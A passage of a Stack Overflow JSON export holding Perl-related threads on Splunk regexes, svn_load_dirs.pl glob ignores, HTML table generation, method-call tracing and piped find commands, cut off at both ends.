are useful"}, {"owner": {"reputation": 7927, "user_id": 5214807, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aq31b.jpg?s=128&g=1", "display_name": "Saleem", "link": "https://stackoverflow.com/users/5214807/saleem"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457125981, "post_id": 35805526, "comment_id": 59281640, "body": "@Borodin, yes I agree with you on  flags /gmis. However, based on limited knowledge of input string, it could be multiline capture so to be on safe side, I added this, assuming OP knows what being done and can adjust based on needs. I&#39;m not capturing <code>^</code> or <code>$</code> so /ms are irrelevant. However, g (global) is required as OP may have many more captures than just one."}], "tags": [], "owner": {"reputation": 7927, "user_id": 5214807, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aq31b.jpg?s=128&g=1", "display_name": "Saleem", "link": "https://stackoverflow.com/users/5214807/saleem"}, "is_accepted": false, "score": 1, "last_activity_date": 1457126583, "last_edit_date": 1457126583, "creation_date": 1457123591, "answer_id": 35805526, "question_id": 35805191, "link": "https://stackoverflow.com/questions/35805191/using-regex-to-grab-a-field-in-brackets/35805526#35805526", "title": "Using RegEx to grab a field in brackets", "body": "<p>I'd try the following regex:</p>\n\n<pre><code>(?&lt;=UserDataGuid \\[).*?(?=\\])/g\n</code></pre>\n\n<p>This will capture <code>fas08f0da-faf6-4308-aad6-hfld5643gs</code>. See a demo <a href=\"https://regex101.com/r/yK4qC8/1\" rel=\"nofollow\">here</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 1179, "user_id": 5228843, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c604041f56d88ec4d3f84b7e0f269c81?s=128&d=identicon&r=PG&f=1", "display_name": "matsib.dev", "link": "https://stackoverflow.com/users/5228843/matsib-dev"}, "is_accepted": false, "score": 1, "last_activity_date": 1457355298, "last_edit_date": 1457355298, "creation_date": 1457124537, "answer_id": 35805750, "question_id": 35805191, "link": "https://stackoverflow.com/questions/35805191/using-regex-to-grab-a-field-in-brackets/35805750#35805750", "title": "Using RegEx to grab a field in brackets", "body": "<p>With</p>\n\n<pre><code>\\]\\s(?&lt;UserDataGuid&gt;.*?)\\s*$\n</code></pre>\n\n<p>you say: match a <em>]</em> <strong>></strong> <code>\\]</code>, follow by any space character (only one) <strong>></strong> <code>\\s</code>, follow by a group with name <em>UserDataGuid</em> <strong>></strong> <code>(?&lt;UserDataGuid&gt; ... )</code> that contains any character, except newline (zero times, to unlimited times) <strong>></strong> <code>.*?</code> ( in lazy mode, <strong>?</strong> ), follow by any space character (zero times, to unlimited times) <strong>></strong> <code>\\s*</code>, follow by end of string <strong>></strong> <code>$</code> </p>\n\n<p>I think that you don't want this <code>(?&lt;UserDataGuid&gt; ... )</code>;\nyou want match (in some way) <code>UserDataGuid</code>, no call <code>UserDataGuid</code> at the group that match \" any character, except newline (zero times, to unlimited times) <strong>></strong> <code>.*?</code> ( in lazy mode, <strong>?</strong> ) \"</p>\n\n<p>In </p>\n\n<pre><code>(?i)UserDataGuid\\s*\\[([^\\}]*)\\]\n</code></pre>\n\n<p>change the <strong>}</strong>, for a <strong>]</strong>, and then, you captured your GUID in group #1</p>\n\n<p>but, you don't need match \"<em>UserDataGuid\\s</em>[*\"\nyou could use:</p>\n\n<blockquote>\n  <p><code>(?&lt;=UserDataGuid \\[)([^\\]]*)</code></p>\n</blockquote>\n\n<p>and then, you only match the GUID, and find it in the group #1\nyou can remove the parenthesis of group #1, because is a full match:</p>\n\n<blockquote>\n  <p><code>(?&lt;=UserDataGuid \\[)[^\\]]*</code></p>\n</blockquote>\n\n<p><a href=\"https://regex101.com/r/sI3kW4/1\" rel=\"nofollow\">https://regex101.com/r/sI3kW4/1</a></p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1457124941, "creation_date": 1457124941, "answer_id": 35805861, "question_id": 35805191, "link": "https://stackoverflow.com/questions/35805191/using-regex-to-grab-a-field-in-brackets/35805861#35805861", "title": "Using RegEx to grab a field in brackets", "body": "<p>It looks like you want</p>\n\n<pre><code>(?&lt;=UserDataGuid\\s\\[)([^\\]]*)\n</code></pre>\n"}], "owner": {"reputation": 91, "user_id": 5363370, "user_type": "registered", "accept_rate": 46, "profile_image": "https://i.stack.imgur.com/6F1K3.png?s=128&g=1", "display_name": "h4mme7", "link": "https://stackoverflow.com/users/5363370/h4mme7"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1169, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1457355298, "creation_date": 1457122170, "last_edit_date": 1457126288, "question_id": 35805191, "link": "https://stackoverflow.com/questions/35805191/using-regex-to-grab-a-field-in-brackets", "title": "Using RegEx to grab a field in brackets", "body": "<p>I have multiple square bracketed data in the log file of a splunk log. I am attempting to find a particular field named UserDataGuid and then gather the data in the bracket after this. My only option seems to be regular expressions in a standard that seems similar to perl to me. Yet does not work what am I doing wrong here ?</p>\n\n<pre><code>   | rex \"\\]\\s(?&lt;UserDataGuid&gt;.*?)\\s*$\"\n\n   // this trial looks more promising but grabs the last bracket :( and doesn't name the field, to be used in a subSearch.\n  | rex \"(?i)UserDataGuid\\s*\\[([^\\}]*)\\]\n</code></pre>\n\n<p>the data looks like this </p>\n\n<pre><code>[21] INFO UserDataGuid [fas08f0da-faf6-4308-aad6-hfld5643gs] [(null)] [(null)] [(null)]\n</code></pre>\n\n<p>and I want only the guid</p>\n\n<pre><code>fas08f0da-faf6-4308-aad6-hfld5643gs\n</code></pre>\n\n<p>and I would love for it to be a field I could reuse like fields are used in splunk.</p>\n"}, {"tags": ["perl", "svn"], "comments": [{"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1457121799, "post_id": 35804617, "comment_id": 59279545, "body": "Try wrapping the value in quotes. It&#39;s likely your shell is expanding the <code>*</code> character. ie: <code>--glob_ignores=&#39;*.jazzignore&#39;</code>"}, {"owner": {"reputation": 45, "user_id": 4660523, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/10103944969321758/picture?type=large", "display_name": "Randy Cork", "link": "https://stackoverflow.com/users/4660523/randy-cork"}, "reply_to_user": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1457122873, "post_id": 35804617, "comment_id": 59280111, "body": "That&#39;s what I assumed, so I already had attempted that. It doesn&#39;t appear to be the issue."}, {"owner": {"reputation": 2690, "user_id": 5869736, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b18e361761e0643fd9003f9eae40ba45?s=128&d=identicon&r=PG&f=1", "display_name": "Marty", "link": "https://stackoverflow.com/users/5869736/marty"}, "edited": false, "score": 0, "creation_date": 1457138585, "post_id": 35804617, "comment_id": 59286463, "body": "Can you give us more information on what you mean by &quot;... to behave as I&#39;d expect...&quot;.  I would expect it to successfully ignore files with extension &quot;.jazzignore&quot; but <b>fail to ignore directories called &quot;jazz5&quot;</b> (ie no extension on the directory name).  Is that what its doing?  If not, can you say anything about partial behaviour etc??"}, {"owner": {"reputation": 45, "user_id": 4660523, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/10103944969321758/picture?type=large", "display_name": "Randy Cork", "link": "https://stackoverflow.com/users/4660523/randy-cork"}, "edited": false, "score": 0, "creation_date": 1457368389, "post_id": 35804617, "comment_id": 59363480, "body": "That is what I would expect as well. The current behavior is not ignoring jazzignore folders or files with the flag &quot;--glob_ignores=*.jazzignore&quot; regardless of whether there are quotes around .jazzignore or not."}], "answers": [{"tags": [], "owner": {"reputation": 45, "user_id": 4660523, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/10103944969321758/picture?type=large", "display_name": "Randy Cork", "link": "https://stackoverflow.com/users/4660523/randy-cork"}, "is_accepted": true, "score": 0, "last_activity_date": 1461876860, "creation_date": 1461876860, "answer_id": 36925271, "question_id": 35804617, "link": "https://stackoverflow.com/questions/35804617/using-the-glob-ignores-flag-of-svn-load-dirs-pl/36925271#36925271", "title": "Using the --glob_ignores flag of SVN_Load_Dirs.PL", "body": "<p>It turns out that the script was failing silently because I was running it from a windows cmd (and therefore never getting to the flag option). Apparently there are some issues running it this way and it was designed to be run from a linux command line. After switching it works perfectly.</p>\n"}], "owner": {"reputation": 45, "user_id": 4660523, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/10103944969321758/picture?type=large", "display_name": "Randy Cork", "link": "https://stackoverflow.com/users/4660523/randy-cork"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 61, "favorite_count": 0, "accepted_answer_id": 36925271, "answer_count": 1, "score": 0, "last_activity_date": 1461876860, "creation_date": 1457120077, "question_id": 35804617, "link": "https://stackoverflow.com/questions/35804617/using-the-glob-ignores-flag-of-svn-load-dirs-pl", "title": "Using the --glob_ignores flag of SVN_Load_Dirs.PL", "body": "<p>I am attempting to use the SVN_Load_Dirs.PL script file (<a href=\"https://svn.apache.org/repos/asf/subversion/trunk/contrib/client-side/svn_load_dirs/\" rel=\"nofollow\">https://svn.apache.org/repos/asf/subversion/trunk/contrib/client-side/svn_load_dirs/</a>) to attempt to merge a platform drop.</p>\n\n<p>However, I can't get the --glob_ignores flag to behave as I'd expect, and I know so little perl that I can't dig into the script to understand why. The format I am using is: \n--glob_ignores=*.jazzignore</p>\n\n<p>Where I want to ignore all .jazzignore files (although I am fine with anything with \"jazzignore\" in either the extension or name being ignored. I've looked for examples but can't find any actual usage of this flag anywhere. What I am looking for is a way to ignore all .jazzignore files and a few entire directories (like jazz5 for an example)</p>\n\n<p>I assumed the flag would then be --glob_ignores=\"*.jazzignore *.jazz5\" but that doesn't appear to be working.</p>\n"}, {"tags": ["html", "perl", "html-table", "two-columns"], "comments": [{"owner": {"reputation": 21286, "user_id": 900807, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/cQvyy.jpg?s=128&g=1", "display_name": "SpYk3HH", "link": "https://stackoverflow.com/users/900807/spyk3hh"}, "edited": false, "score": 0, "creation_date": 1457112325, "post_id": 35802033, "comment_id": 59274016, "body": "soooo... you don&#39;t believe in closing tags? <code>&lt;&#47;tbody&gt;&lt;&#47;table&gt;</code> :P"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457114477, "post_id": 35802033, "comment_id": 59275317, "body": "You are free to use whatever identifiers are valid in Perl, but people who are familiar with the language, and others who are unfamiliar with English, will thank you for using <code>snake_case</code> for local variables. An initial capital letter is a particular problem because the language itself reserves names like that for global identifiers such as package names. It doesn&#39;t look like you have a need to use <code>@Sucess</code> and <code>@Failed</code> over <code>@success</code> and <code>@failed</code>"}], "answers": [{"tags": [], "owner": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "is_accepted": false, "score": 1, "last_activity_date": 1457114771, "last_edit_date": 1457114771, "creation_date": 1457112151, "answer_id": 35802234, "question_id": 35802033, "link": "https://stackoverflow.com/questions/35802033/html-table-formatting-issue/35802234#35802234", "title": "HTML Table formatting Issue", "body": "<p>First you loop over each item in <code>@Sucess</code> and for each one you:</p>\n\n<ul>\n<li>Create a new row</li>\n<li>Create a cell in that row</li>\n</ul>\n\n<blockquote>\n<pre><code>$html .= \"&lt;tr&gt;&lt;td&gt;$_&lt;/td&gt;\" for @Sucess;\n</code></pre>\n</blockquote>\n\n<p>Then you look over each item in <code>@Failed</code> and for each one you:</p>\n\n<ul>\n<li>Create a cell in the last row you created (for the most recent <code>@Sucess</code>)</li>\n</ul>\n\n<blockquote>\n<pre><code>$html .= \"&lt;td&gt;$_&lt;/td&gt;\" for @Failed;\n</code></pre>\n</blockquote>\n\n<p>Finally, you explicitly close the last table row you created:</p>\n\n<blockquote>\n<pre><code>$html .= \" &lt;/tr&gt;\";\n</code></pre>\n</blockquote>\n\n<hr>\n\n<p>To get the layout you desire (which is distinctly non-tabular) you need to work row by row. You can't deal with all the <code>@Sucess</code> and <em>then</em> all the <code>@Failed</code>.</p>\n\n<pre><code>my @Sucess= qw(s1 s2 s3 s4 s5 s6);\nmy @Failed= qw(f1 f2 f3 f4);\n\nmy $html = \"&lt;table&gt;\\n\";\n\ndo {\n    my $s = shift @Sucess;\n    my $f = shift @Failed;\n    $html .= sprintf(\"&lt;tr&gt; &lt;td&gt; %s &lt;/td&gt; &lt;td&gt; %s &lt;/td&gt; &lt;/tr&gt; \\n\", map { $_ // '' } $s, $f);\n} while ( @Sucess or @Failed );\n\n$html .= \"&lt;/table&gt;\";\n\nprint $html;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457115852, "post_id": 35802403, "comment_id": 59276143, "body": "The issue with <i>Template Toolkit</i> is that people see their dependencies and identifiers (primarily <code>class</code> strings) spread across multiple files, and it needs a very good IDE to keep track of them all. While it is quite possible to put the template into a program&#39;s <code>DATA</code> section, that approach is a little odd within a module, and it also provide for only one template per source file. That could be overcome clumsily using something like <a href=\"http://metacpan.org/module/Data::Section\" rel=\"nofollow noreferrer\">Data::Section</a>, but any less measures leave us struggling with multiple global identifiers"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1457166996, "post_id": 35802403, "comment_id": 59292132, "body": "That doesn&#39;t sound like an issue with the Template Toolkit, it sounds like an issue with any templating engine. And, to be honest, in well over fifteen years of writing system using templates, yours is not a complaint I&#39;ve ever heard before. Separating the display logic into a different file (or many files) is usually seen as an advantage of this approach. It allows people with different skillsets (front-end vs backend developers) to both work on their own part of the system independently."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 2, "last_activity_date": 1457167079, "last_edit_date": 1457167079, "creation_date": 1457112652, "answer_id": 35802403, "question_id": 35802033, "link": "https://stackoverflow.com/questions/35802033/html-table-formatting-issue/35802403#35802403", "title": "HTML Table formatting Issue", "body": "<p>You need to replace your code that builds up the table with something that works in a logical order. HTML tables need to be defined row by row. You can't process all of the successes and then all of the failures.</p>\n\n<p>I'd replace your middle section of code with something like this:</p>\n\n<pre><code>use List::Util qw[max];\n\nmy $max = max($#Sucess, $#Failed);\n\nfor (0 .. $max) {\n  $html .= '&lt;tr&gt;&lt;td&gt;';\n  $html .= $Sucess[$_] // '';\n  $html .= '&lt;/td&gt;&lt;td&gt;';\n  $html .= $Failed[$_] // '';\n  $html .= \"&lt;/td&gt;&lt;/tr&gt;\\n\";\n}\n</code></pre>\n\n<p>But actually, I would never put raw HTML in a Perl program. Use a <a href=\"https://metacpan.org/pod/Template\" rel=\"nofollow\">templating system</a> instead.</p>\n"}], "owner": {"reputation": 1535, "user_id": 2175642, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/438be96ab62abdf3194b7b1b0f85507b?s=128&d=identicon&r=PG", "display_name": "Jill448", "link": "https://stackoverflow.com/users/2175642/jill448"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 464, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1491319899, "creation_date": 1457111567, "last_edit_date": 1491319899, "question_id": 35802033, "link": "https://stackoverflow.com/questions/35802033/html-table-formatting-issue", "title": "HTML Table formatting Issue", "body": "<p>I am trying to align contents of two arrays in a tabular format and send an email. But the second column in the table doesn't align as desired. The content of the second column appears as a single row.</p>\n\n<p>I'm attaching output table as well:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse MIME::Lite;\nuse HTML::Entities;\n\nmy $msg;\nmy @Sucess = qw(s1 s2 s3 s4 s5 s6);\nmy @Failed = qw(f1 f2 f3 f4);\n\nmy $html = '&lt;table style=\"width:600px;margin:0 100px\" border=\"1\" BORDERCOLOR=\"#000000\"&gt;\n    &lt;thead&gt;&lt;th bgcolor=\"#9fc0fb\"&gt;Successful&lt;/th&gt;&lt;th bgcolor=\"#9fc0fb\"&gt;Failed&lt;/th&gt;&lt;/thead&gt;\n    &lt;tbody&gt;';    \n\n$html .= \"&lt;tr&gt;&lt;td&gt;$_&lt;/td&gt;\" for @Sucess;\n$html .= \"&lt;td&gt;$_&lt;/td&gt;\" for @Failed;\n$html .= \" &lt;/tr&gt;\";\n\n\n$msg = MIME::Lite-&gt;new(\n    from    =&gt; 'foo@abc.com',\n    To      =&gt; 'foo@abc.com',\n    Subject =&gt; 'Status of Update',\n    Type    =&gt; 'multipart/related'\n);\n\n$msg-&gt;attach(\n    Type =&gt; 'text/html',\n    Data =&gt; qq{\n        &lt;body&gt;\n        &lt;html&gt;$html&lt;/html&gt;\n        &lt;/body&gt;\n    },\n);\n\nMIME::Lite-&gt;send ('smtp','xyz.global.abc.com' );\n$msg-&gt;send;\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/LJroQ.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/LJroQ.png\" alt=\"Output Table\"></a></p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 12427, "user_id": 498634, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/580e34a7c6e156d847e8ee768388daa4?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel B&#246;hmer", "link": "https://stackoverflow.com/users/498634/daniel-b%c3%b6hmer"}, "edited": false, "score": 0, "creation_date": 1545338781, "post_id": 35801558, "comment_id": 94598800, "body": "The desired tool is <code>perl -MDebug::LTrace=&#39;*&#39; your_program.pl</code> which logs all method calls"}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 3, "last_activity_date": 1457110102, "creation_date": 1457110102, "answer_id": 35801558, "question_id": 35801307, "link": "https://stackoverflow.com/questions/35801307/trace-perl-method-calls/35801558#35801558", "title": "Trace Perl Method Calls", "body": "<p>I tried googling for \"perl trace sub calls\". The first two hits seem appropriate:\n<a href=\"http://p3rl.org/Debug::Trace\" rel=\"nofollow\">Debug::Trace</a> and <a href=\"http://p3rl.org/Debug::LTrace\" rel=\"nofollow\">Debug::LTrace</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "is_accepted": false, "score": 3, "last_activity_date": 1457110804, "creation_date": 1457110804, "answer_id": 35801799, "question_id": 35801307, "link": "https://stackoverflow.com/questions/35801307/trace-perl-method-calls/35801799#35801799", "title": "Trace Perl Method Calls", "body": "<p>Use a profiler. <a href=\"http://p3rl.org/Devel::NYTProf\" rel=\"nofollow\"><code>Devel::NYTProf</code></a> is pretty much defacto standard for that.</p>\n"}], "owner": {"reputation": 3032, "user_id": 831964, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/ae05678df2d9f582cc9d821bfa19d86c?s=128&d=identicon&r=PG", "display_name": "evolution", "link": "https://stackoverflow.com/users/831964/evolution"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 333, "favorite_count": 0, "closed_date": 1457130405, "answer_count": 2, "score": 3, "last_activity_date": 1457110804, "creation_date": 1457109444, "last_edit_date": 1457110199, "question_id": 35801307, "link": "https://stackoverflow.com/questions/35801307/trace-perl-method-calls", "closed_reason": "Not suitable for this site", "title": "Trace Perl Method Calls", "body": "<p>I'm looking for a good Perl library that will trace method calls and dump them to a file as a program executes.</p>\n\n<p>I know of <a href=\"http://p3rl.org/Devel::Trace\" rel=\"nofollow\">Devel::Trace</a> but it is quite limited and the output is super verbose.</p>\n\n<p>Is there something better out there?</p>\n\n<p>I'd like to be able to run something like the following from CLI.</p>\n\n<pre><code>perl -MTracer(\"My::Package::*\", my_trace_file) my_large_modularized_program.pl\n</code></pre>\n\n<p>Ideally that would dump a list of method calls made in <code>My::Package</code> out to the file <code>my_trace_file</code>.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "edited": false, "score": 1, "creation_date": 1457109678, "post_id": 35801047, "comment_id": 59272254, "body": "The -ls doesn&#39;t take an argument."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1457109713, "post_id": 35801047, "comment_id": 59272280, "body": "What does &quot;it doesn&#39;t work&quot; mean?"}, {"owner": {"reputation": 13, "user_id": 6019203, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0cf5d1f0da6921e84f8d06d1a369ebda?s=128&d=identicon&r=PG&f=1", "display_name": "Johnny", "link": "https://stackoverflow.com/users/6019203/johnny"}, "edited": false, "score": 0, "creation_date": 1457115475, "post_id": 35801047, "comment_id": 59275880, "body": "I hope ls those files in the last 12 hours, but it ls all of them."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457117427, "post_id": 35801047, "comment_id": 59277018, "body": "@Johnny <code>-mtime 0</code> will return everything modified in the last 24 hours, not 12 hours."}], "answers": [{"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1457111218, "post_id": 35801494, "comment_id": 59273323, "body": "Don&#39;t forget to close the filehandle and check the success of <code>close</code>; with piped opens, <code>open</code> only returns whether <code>fork</code> was successful, not whether the invoked program was."}, {"owner": {"reputation": 13, "user_id": 6019203, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0cf5d1f0da6921e84f8d06d1a369ebda?s=128&d=identicon&r=PG&f=1", "display_name": "Johnny", "link": "https://stackoverflow.com/users/6019203/johnny"}, "edited": false, "score": 0, "creation_date": 1457115496, "post_id": 35801494, "comment_id": 59275896, "body": "I hope ls those files in the last 12 hours, but it ls all of them."}], "tags": [], "owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "is_accepted": true, "score": 0, "last_activity_date": 1457109898, "creation_date": 1457109898, "answer_id": 35801494, "question_id": 35801047, "link": "https://stackoverflow.com/questions/35801047/opening-for-anonymous-pipes-perl-programming/35801494#35801494", "title": "Opening for Anonymous Pipes Perl Programming", "body": "<pre><code>use warnings;\nopen(LISTDIR, \"find ~ -type f -mtime 0 -ls |  \") or die \"PIPE failed $!\\n\";\nwhile( $filename = &lt;LISTDIR&gt; ){\n    print $filename;\n}\n</code></pre>\n\n<p>You should have seen an error message:</p>\n\n<pre><code>find: paths must precede expression: /Users/Perl\n</code></pre>\n\n<p>which explains everything.</p>\n"}], "owner": {"reputation": 13, "user_id": 6019203, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0cf5d1f0da6921e84f8d06d1a369ebda?s=128&d=identicon&r=PG&f=1", "display_name": "Johnny", "link": "https://stackoverflow.com/users/6019203/johnny"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 62, "favorite_count": 0, "accepted_answer_id": 35801494, "answer_count": 1, "score": 0, "last_activity_date": 1457109898, "creation_date": 1457108696, "question_id": 35801047, "link": "https://stackoverflow.com/questions/35801047/opening-for-anonymous-pipes-perl-programming", "title": "Opening for Anonymous Pipes Perl Programming", "body": "<p>How to test whether any of the files listed have been modified in the last 12 hours in perl programming. Print the names of those files.</p>\n\n<p>Here is my code, but it does not work. Could anyone teach me how to fix it?</p>\n\n<pre><code>use warnings;\n  open(LISTDIR, \"find ~ -type f -mtime 0 -ls /Users/Perl/ |  \") or die \"PIPE failed $!\\n\";\n  while( $filename = &lt;LISTDIR&gt; ){\n     print $filename;\n   }\n</code></pre>\n"}, {"tags": ["linux", "bash", "perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457108772, "post_id": 35800966, "comment_id": 59271608, "body": "Are you going to call the command immediately anyway?"}, {"owner": {"reputation": 11845, "user_id": 3280538, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/pYuGC.jpg?s=128&g=1", "display_name": "flakes", "link": "https://stackoverflow.com/users/3280538/flakes"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457108821, "post_id": 35800966, "comment_id": 59271658, "body": "@ikegami no, its halfway through the script"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457109101, "post_id": 35800966, "comment_id": 59271851, "body": "Then just running it makes no sense."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457109173, "post_id": 35800966, "comment_id": 59271906, "body": "Do you have the full path to the external program?"}, {"owner": {"reputation": 11845, "user_id": 3280538, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/pYuGC.jpg?s=128&g=1", "display_name": "flakes", "link": "https://stackoverflow.com/users/3280538/flakes"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457109342, "post_id": 35800966, "comment_id": 59272012, "body": 